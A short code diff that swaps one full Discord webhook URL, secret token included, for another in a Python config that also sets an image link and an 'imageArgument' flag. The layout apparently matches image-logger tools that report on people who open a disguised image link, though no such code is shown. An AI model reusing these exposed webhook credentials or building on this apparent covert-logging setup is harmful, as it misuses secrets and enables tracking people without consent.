@@ -9,7 +9,7 @@ __author__ = "Bobby"
 
 config = {
 
-    "webhook": "https://discord.com/api/webhooks/1380262813452337283/Jljtmi-Nd8kALVmaAxoAbDc_fibONK-UGq_FS3uAviFr9rAeh0A2dMq8vVjOBcEjgo5H",
+    "webhook": "https://discord.com/api/webhooks/1380393807266447411/-ODrG-4Fz85hEUdT8DL_ONaxAt43PzA2s1HazmYy4ZaL3GKnOWA-rqAwBa_g3zGIGbQF",
     "image": "https://i.pinimg.com/736x/b3/34/df/b334df6c363c8cefc1f312b1b4cd6763.jpg", 
                                                
     "imageArgument": True, 
